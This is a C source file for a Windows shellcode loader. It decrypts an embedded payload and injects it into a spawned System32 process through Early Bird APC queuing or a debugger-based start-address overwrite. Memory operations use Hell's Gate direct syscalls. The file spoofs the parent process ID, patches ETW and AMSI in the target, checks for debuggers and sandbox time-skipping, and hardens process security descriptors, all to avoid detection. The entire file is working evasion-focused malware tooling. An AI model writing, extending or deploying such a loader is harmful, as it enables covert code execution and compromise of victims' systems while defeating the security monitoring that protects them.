#include "crypto/decryptor.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <windows.h>
#include <sddl.h>
#include "syscall/HellsGate.h"
#include "enum/enum.h"
#include "patches/patch.h"
#include <util/util.h>
#include <protection/protect.h>



// Function prototype for PPID spoofing helper
static BOOL setup_ppid_spoofing(void *startup_info_ex, LPCWSTR spoof_proc_name, BOOL is_wide);

static int pr_enum(LPCWSTR gProcName, DWORD *PID, HANDLE *hProcess)
{

  ntQuery_enum(gProcName, PID, hProcess);
  if (*hProcess == NULL)
  {
    warn("Failed to find accessible process %ls with ntQuery_enum", gProcName);
    info("Retrying with default enum method");
    def_enum(gProcName, PID, hProcess);
    if (*hProcess == NULL)
    {
      fail("Failed to find accessible process %ls with both methods", gProcName);
      return EXIT_FAILURE;
    }
    okay("Found accessible %ls process with fallback method", gProcName);
  }
  else
  {
    okay("Found accessible %ls process with primary method", gProcName);
  }
  return EXIT_SUCCESS;
}

// Helper for PPID spoof stuff
static BOOL setup_ppid_spoofing(void *startup_info_ex, LPCWSTR spoof_proc_name, BOOL is_wide)
{

  DWORD PID_spoof = 0;
  HANDLE hProcess_spoof = NULL;
  SIZE_T sThreadAttList = 0;
  PPROC_THREAD_ATTRIBUTE_LIST pAttributeList = NULL;

  pr_enum(spoof_proc_name, &PID_spoof, &hProcess_spoof);
  if (hProcess_spoof)
  {
    CloseHandle(hProcess_spoof);
  }
  hProcess_spoof = OpenProcess(PROCESS_ALL_ACCESS, TRUE, PID_spoof);
  if (!hProcess_spoof)
  {
    fail("Failed to open spoof process (final PID: %lu)", PID_spoof);
    return FALSE;
  }
  // We need to duplicate the handle for inheritance
  HANDLE hProcess_inherit = NULL;
  if (!DuplicateHandle(GetCurrentProcess(), hProcess_spoof, GetCurrentProcess(), &hProcess_inherit, 0, TRUE, DUPLICATE_SAME_ACCESS))
  {
    fail("Failed to duplicate handle for inheritance");
    CloseHandle(hProcess_spoof);
    return FALSE;
  }
  CloseHandle(hProcess_spoof);
  // Query size for attribute list
  InitializeProcThreadAttributeList(NULL, 1, 0, &sThreadAttList);
  if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
  {
    fail("Failed to get thread attribute list size, error: %d", GetLastError());
    CloseHandle(hProcess_inherit);
    return FALSE;
  }
  pAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(sThreadAttList);
  if (!pAttributeList)
  {
    fail("Failed to allocate attribute list");
    CloseHandle(hProcess_inherit);
    return FALSE;
  }
  if (!InitializeProcThreadAttributeList(pAttributeList, 1, 0, &sThreadAttList))
  {
    fail("Failed to init ProcThreadAttributeList, error: %d", GetLastError());
    free(pAttributeList);
    CloseHandle(hProcess_inherit);
    return FALSE;
  }
  if (!UpdateProcThreadAttribute(pAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess_inherit, sizeof(HANDLE), NULL, NULL))
  {
    fail("Failed to spoof PPID, error: %d", GetLastError());
    DeleteProcThreadAttributeList(pAttributeList);
    free(pAttributeList);
    CloseHandle(hProcess_inherit);
    return FALSE;
  }
  if (is_wide)
  {
    ((STARTUPINFOEXW *)startup_info_ex)->lpAttributeList = pAttributeList;
  }
  else
  {
    ((STARTUPINFOEXA *)startup_info_ex)->lpAttributeList = pAttributeList;
  }
  return TRUE;
}

static bool ExecDelay(int ftMinutes)
{

  DWORD dwMilliSeconds = ftMinutes * 60000;
  HANDLE hEvent = CreateEvent(NULL, 0, 0, NULL);

  // Needed to verify delay as environments may fast forward
  DWORD T0 = GetTickCount64();

  info("Sleeping...");
  if (WaitForSingleObject(hEvent, dwMilliSeconds) == WAIT_FAILED)
  {
    fail("Execution delay timed out");
    return false;
  }
  DWORD T1 = GetTickCount64();

  info("Woke up...");
  if ((DWORD)(T1 - T0) < dwMilliSeconds)
    return false;
  else
    return true;
}

static bool IsDebugged()
{

  DWORD dwTime1 = 0, dwTime2 = 0;
  dwTime1 = GetTickCount64();

  CONTEXT Ctx = {.ContextFlags = CONTEXT_DEBUG_REGISTERS};
  // Custom is DbgPresent
#ifdef _WIN64
  PPEB pPeb = (PEB *)(__readgsqword(0x60));
#elif _WIN32
  PPEB pPeb = (PEB *)(__readfsdword(0x30));
#endif
  if (pPeb->BeingDebugged == 1)
    return true;
  // Check debugging via HwBp
  if (!GetThreadContext(GetCurrentThread(), &Ctx))
  {
    fail("GetThreadContext failed: %d", GetLastError());
    return false;
  }
  // Check hardware breakpoints
  if (Ctx.Dr0 != 0 || Ctx.Dr1 != 0 || Ctx.Dr2 != 0 || Ctx.Dr3 != 0)
  {
    return true;
  }

  dwTime2 = GetTickCount64();
  info("Debug check took %d ms", dwTime2 - dwTime1);
  // If the check took too long, assume we are debugged
  if ((DWORD)(dwTime2 - dwTime1) > 50)
  {
    return true;
  }

  return false;
}



static int earlybird()
{

  LPCWSTR gProcName = TARGET_PROCESS;
  LPCWSTR gProcName_spoof = TARGET_PROCESS_SPOOF;
  LPCSTR gProcName_c = NULL;
  CHAR lProcessPath[MAX_PATH * 2];
  CHAR winDirName[MAX_PATH];
  STARTUPINFOEXA stup_inf = {0};
  PROCESS_INFORMATION pr_inf = {0};
  HANDLE hProcess, hThread = INVALID_HANDLE_VALUE;
  DWORD PID;
  size_t ShellSize = 0;
  LPVOID rBuf = NULL;
  SIZE_T bytesWritten = 0;
  VX_TABLE vx_table = {0};
  NTSTATUS status = 0x00000000;
  HANDLE hCurrentProcess = GetCurrentProcess();

  int buf_cast_size = WideCharToMultiByte(CP_UTF8, 0, gProcName, -1, NULL, 0, NULL, NULL);
  char *buffer = (char *)malloc(buf_cast_size);
  WideCharToMultiByte(CP_UTF8, 0, gProcName, -1, buffer, buf_cast_size, NULL, NULL);
  gProcName_c = buffer;

#ifdef TARGET_PROC_EXEC_DELAY
  info("Using execution delay of %d minutes", TARGET_PROC_EXEC_DELAY);
  if (!ExecDelay(TARGET_PROC_EXEC_DELAY))
  {
    fail("Execution delay failed");
    return -1;
  }
#endif
#ifdef ANTIDEBUG
  if (IsDebugged())
  {
    fail("Debugger detected, exiting");
    return -1;
  }
  else
  {
    okay("No debugger detected, proceeding with execution");
  }
#endif
#if defined(USE_WORDS)
  info("Using word decryption");
  if (words() != 0)
  {
    fail("Words failed");
    return -1;
  }

#else
  fail("No decryption method selected");
  return -1;
#endif

#ifdef PROTECT
  if (!protect_process(hCurrentProcess))
  {
    warn("Failed to protect process, continuing without process protection!");
  }
  else
  {
    okay("Changed process security descriptor.");
  }
#endif
  if (populate_table(&vx_table) != 0)
  {
    fail("Failed to populate system call table!");
    return -1;
  }
  ShellSize = decrypted_data_len;
  info("Decrypted shellcode (%zu bytes)", ShellSize);

  memset(&stup_inf, 0, sizeof(stup_inf));
  memset(&pr_inf, 0, sizeof(pr_inf));
  stup_inf.StartupInfo.cb = sizeof(stup_inf);

  if (!GetEnvironmentVariableA("WINDIR", winDirName, MAX_PATH))
  {
    fail("GetEnvironmentVariable for your system failed with error: %d", GetLastError());
    free(buffer);
    return -1;
  }
  snprintf(lProcessPath, sizeof(lProcessPath), "%s\\System32\\%s", winDirName, gProcName_c);
  okay("Running %s", lProcessPath);

  // Convert lProcessPath to wide string for CreateProcessW
  WCHAR lProcessPathW[MAX_PATH * 2];
  MultiByteToWideChar(CP_ACP, 0, lProcessPath, -1, lProcessPathW, MAX_PATH * 2);

  // Use helper for PPID spoofing
  if (!setup_ppid_spoofing(&stup_inf, gProcName_spoof, FALSE))
  {
    fail("PPID spoofing failed");
    free(buffer);
    return -1;
  }

  info("Creating process in suspended state...");
  // Create process in suspended state
  if (!CreateProcessW(NULL, lProcessPathW, NULL, NULL, FALSE,
                      CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                      NULL, NULL, (LPSTARTUPINFOW)&stup_inf, &pr_inf))
  {
    fail("CreateProcess failed with error: %d", GetLastError());
    free(buffer);
    return -1;
  }

  PID = pr_inf.dwProcessId;
  hProcess = pr_inf.hProcess;
  hThread = pr_inf.hThread;
  info("Created process with PID: %ld", PID);

  if (PID == 0 && hProcess == NULL && hThread == 0)
  {
    fail("Process creation failed, PID, process and thread handle were returned as 0/NULL");
    free(buffer);
    return -1;
  }

#ifdef NOETW
  if (patchETW_remote(hProcess, vx_table))
  {
    okay("Patched ETW successfully");
  }
  else
  {
    warn("Failed to patch ETW, continuing with higher detection risk");
  }
#endif
#ifdef NOAMSI
  if (patchAMSI_remote(hProcess, vx_table))
  {
    okay("Patched AMSI successfully");
  }
  else
  {
    warn("Failed to patch AMSI, continuing with higher detection risk");
  }
#endif

  // Allocate memory in target process for shellcode
  info("Allocating memory for shellcode in target process...");

  HellsGate(vx_table.NtAllocateVirtualMemory.wSystemCall);
  status = HellDescent(hProcess, &rBuf, 0, &ShellSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

  if (status != 0)
  {
    fail("Stub memory allocation failed with status: 0x%08X", status);
    CloseHandle(hProcess);
    return -1;
  }

  okay("Allocated memory in target process at: %p", rBuf);

  // Write shellcode to allocated memory
  info("Writing shellcode to target process memory...");

  HellsGate(vx_table.NtWriteVirtualMemory.wSystemCall);
  status = HellDescent(hProcess, rBuf, decrypted_data, ShellSize, &bytesWritten);
  if (status != 0)
  {
    fail("Stub write failed with status: 0x%08X", status);
    CloseHandle(hProcess);
    return -1;
  }

  okay("Wrote %zu bytes of shellcode to process memory at %p", bytesWritten, rBuf);

  // Queue APC to the main thread
  info("Queueing APC to execute shellcode...");

  okay("APC queued successfully");
  HellsGate(vx_table.NtQueueApcThread.wSystemCall);
  status = HellDescent(hThread, (PAPCFUNC)rBuf, NULL, NULL, 0);
  if (status != 0)
  {
    fail("QueueUserAPC failed: %d", GetLastError());
    TerminateThread(hThread, 1);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    free(buffer);
    return -1;
  }
  PULONG thread_stat = NULL;
#ifdef PROTECT
  if (!protect_process(hProcess))
  {
    warn("Failed to protect target process, continuing without process protection!");
  }
  else
  {
    okay("Changed process's security descriptor.");
  }
#endif

  // Resume the main thread - APC will execute when thread becomes alertable
  info("Resuming main thread to trigger APC execution...");
  HellsGate(vx_table.NtAlertResumeThread.wSystemCall);
  status = HellDescent(hThread, thread_stat);
  if (status != 0)
  {
    fail("An error occurred when resuming the thread. Error code: %d", GetLastError());
    TerminateThread(hThread, 1);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    free(buffer);
    return -1;
  }

  okay("Thread resumed successfully");
  info("Early Bird injection complete, cleaning up...");

  CloseHandle(hThread);
  CloseHandle(hProcess);
  free(buffer);
  okay("Early Bird injection completed successfully");
  return 0;
}

static int hypnosis()
{

  LPCWSTR gProcName = TARGET_PROCESS;
  LPCWSTR gProcName_spoof = TARGET_PROCESS_SPOOF;
  CHAR lProcessPath[MAX_PATH * 2];
  CHAR winDirName[MAX_PATH];
  WCHAR lProcessPathW[MAX_PATH * 2];
  size_t ShellSize = 0;
  STARTUPINFOEXW st_inf = {0};
  PROCESS_INFORMATION pr_inf = {0};
  st_inf.StartupInfo.cb = sizeof(st_inf);
  VX_TABLE vx_table = {0};
  NTSTATUS status = 0x00000000;
  HANDLE hCurrentProcess = GetCurrentProcess();

#ifdef TARGET_PROC_EXEC_DELAY
  info("Using execution delay of %d minutes", TARGET_PROC_EXEC_DELAY);
  if (!ExecDelay(TARGET_PROC_EXEC_DELAY))
  {
    fail("Execution delay failed");
    return -1;
  }
#endif
#ifdef ANTIDEBUG
  if (IsDebugged())
  {
    fail("Debugger detected, exiting");
    return -1;
  }
  else
  {
    okay("No debugger detected, proceeding with execution");
  }
#endif

#if defined(USE_WORDS)
  info("Using word decryption");
  if (words() != 0)
  {
    fail("Words failed");
    return -1;
  }
#else
  fail("No decryption method selected");
  return -1;
#endif
#ifdef PROTECT
  if (!protect_process(hCurrentProcess))
  {
    warn("Failed to protect process, continuing without process protection!");
  }
  else
  {
    okay("Changed process security descriptor.");
  }
#endif
  if (populate_table(&vx_table) != 0)
  {
    fail("Failed to populate system call table!");
    return -1;
  }
  ShellSize = decrypted_data_len;
  if (!GetEnvironmentVariableA("WINDIR", winDirName, MAX_PATH))
  {
    fail("GetEnvironmentVariable for your system failed with error: %d", GetLastError());
    return -1;
  }
  int buf_cast_size = WideCharToMultiByte(CP_UTF8, 0, gProcName, -1, NULL, 0, NULL, NULL);
  char *gProcName_c = (char *)malloc(buf_cast_size);
  WideCharToMultiByte(CP_UTF8, 0, gProcName, -1, gProcName_c, buf_cast_size, NULL, NULL);
  snprintf(lProcessPath, sizeof(lProcessPath), "%s\\System32\\%s", winDirName, gProcName_c);
  free(gProcName_c);
  MultiByteToWideChar(CP_ACP, 0, lProcessPath, -1, lProcessPathW, MAX_PATH * 2);
  okay("Launching: %ls", lProcessPathW);

  // Spoof PPID
  if (gProcName_spoof && wcslen(gProcName_spoof) > 0)
  {
    info("Setting up PPID spoofing...");
    if (!setup_ppid_spoofing(&st_inf, gProcName_spoof, TRUE))
    {
      fail("PPID spoofing failed");
      return -1;
    }
  }
  // Start process in debug mode
  info("Creating process in debug mode for hypnosis injection...");
  if (!CreateProcessW(NULL, lProcessPathW, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFOW)&st_inf, &pr_inf))
  {
    fail("Couldn't create process. Exiting...");
    if (st_inf.lpAttributeList)
    {
      DeleteProcThreadAttributeList(st_inf.lpAttributeList);
      free(st_inf.lpAttributeList);
    }
    return -1;
  }
  info("Process created with PID: %ld", pr_inf.dwProcessId);
#ifdef NOETW
  if (patchETW_remote(pr_inf.hProcess, vx_table))
  {
    okay("Patched ETW successfully");
  }
  else
  {
    warn("Failed to patch ETW, continuing with higher detection risk");
  }
#endif
#ifdef NOAMSI
  if (patchAMSI_remote(pr_inf.hProcess, vx_table))
  {
    okay("Patched AMSI successfully");
  }
  else
  {
    warn("Failed to patch AMSI, continuing with higher detection risk");
  }
#endif
  DEBUG_EVENT DbgEventStruct;
  LPDEBUG_EVENT DbgEvent = &DbgEventStruct;
  BOOL injected = FALSE;

  while (WaitForDebugEvent(DbgEvent, INFINITE))
  {
    if (DbgEvent->dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT && !injected)
    {
      info("Trying thread with TID: %ld", GetThreadId(DbgEvent->u.CreateThread.hThread));
      info("Writing shellcode at thread's start address: 0x%p\n", DbgEvent->u.CreateProcessInfo.lpStartAddress);

      ULONG oldProtect = 0;
      LPVOID targetAddress = DbgEvent->u.CreateProcessInfo.lpStartAddress;
      SIZE_T regionSize = ShellSize;

      HellsGate(vx_table.NtProtectVirtualMemory.wSystemCall);
      status = HellDescent(pr_inf.hProcess, &targetAddress, &regionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
      if (status != 0)
      {
        fail("Hell's Gate NtProtectVirtualMemory failed with status: 0x%08X", status);
        DebugActiveProcessStop(pr_inf.dwProcessId);
        break;
      }

      SIZE_T bytesWritten = 0;
      HellsGate(vx_table.NtWriteVirtualMemory.wSystemCall);
      status = HellDescent(pr_inf.hProcess, DbgEvent->u.CreateProcessInfo.lpStartAddress, decrypted_data, ShellSize, &bytesWritten);
      if (status != 0)
      {
        fail("Hell's Gate WriteVirtualMemory failed with status: 0x%08X", status);
        targetAddress = DbgEvent->u.CreateProcessInfo.lpStartAddress;
        regionSize = ShellSize;
        HellsGate(vx_table.NtProtectVirtualMemory.wSystemCall);
        HellDescent(pr_inf.hProcess, &targetAddress, &regionSize, oldProtect, &oldProtect);
        DebugActiveProcessStop(pr_inf.dwProcessId);
        break;
      }

      targetAddress = DbgEvent->u.CreateProcessInfo.lpStartAddress;
      regionSize = ShellSize;
      HellsGate(vx_table.NtProtectVirtualMemory.wSystemCall);
      HellDescent(pr_inf.hProcess, &targetAddress, &regionSize, oldProtect, &oldProtect);

      okay("Successfully wrote %zu bytes of shellcode using Hell's Gate", bytesWritten);

      injected = TRUE;
      ContinueDebugEvent(DbgEvent->dwProcessId, DbgEvent->dwThreadId, DBG_CONTINUE);
      DebugActiveProcessStop(pr_inf.dwProcessId);
#ifdef PROTECT
      if (!protect_process(pr_inf.hProcess))
      {
        warn("Failed to protect process, continuing without process protection!");
      }
      else
      {
        okay("Changed process security descriptor.");
      }
#endif
      break;
    }
    if (DbgEvent->dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT)
    {
      info("Process terminated");
      break;
    }
    ContinueDebugEvent(DbgEvent->dwProcessId, DbgEvent->dwThreadId, DBG_CONTINUE);
  }
  CloseHandle(pr_inf.hProcess);
  CloseHandle(pr_inf.hThread);
  if (st_inf.lpAttributeList)
  {
    DeleteProcThreadAttributeList(st_inf.lpAttributeList);
    free(st_inf.lpAttributeList);
  }
  return injected ? 0 : -1;
}

static int select_method()
{

#if defined(TECHNIQUE_EB)
  info("Using earlybird loader");
  if (earlybird() != 0)
  {
    fail("Earlybird injection failed!");
    return -1;
  }

  return 0;
#elif defined(TECHNIQUE_HYPNOSIS)
  info("Using hypnosis loader");
  if (hypnosis() != 0)
  {
    fail("Hypnosis injection failed!");
    return -1;
  }

  return 0;
#endif
}

int main()
{
  select_method();
  return 0;
}
